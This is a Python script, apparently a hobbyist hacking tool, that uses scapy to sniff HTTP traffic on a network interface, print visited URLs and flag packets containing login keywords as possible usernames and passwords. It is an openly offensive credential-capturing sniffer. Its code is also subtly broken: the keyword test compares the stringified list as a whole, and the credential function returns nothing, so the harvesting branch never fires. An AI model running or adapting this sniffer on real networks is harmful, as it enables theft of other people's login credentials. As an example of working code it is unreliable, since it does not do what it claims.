#!/usr/bin/python3

import scapy.all as scapy
from scapy.layers import http
import argparse
import pyfiglet

banner = pyfiglet.figlet_format("HTTP Sniffer", font = "slant")
print(banner)

print("<+> Waiting for the user to go to any website\n\n")

def getArguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="target", help="Enter the Interface")
    options = parser.parse_args()
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets)
        

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = str(["username", "password", "login", "pass", "user"])
        if keywords in load:
            print(load)
                

def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path
        print(str(url))
        
        login_info = get_login_info(packet)
        if login_info:
            print(str("\n\nPossible Username and Password"+login_info+"\n\n"))

options = getArguments()

try:
    sniff(options.target)
except KeyboardInterrupt:
    print("<+>Detected [ctrl+c] quitting the program.")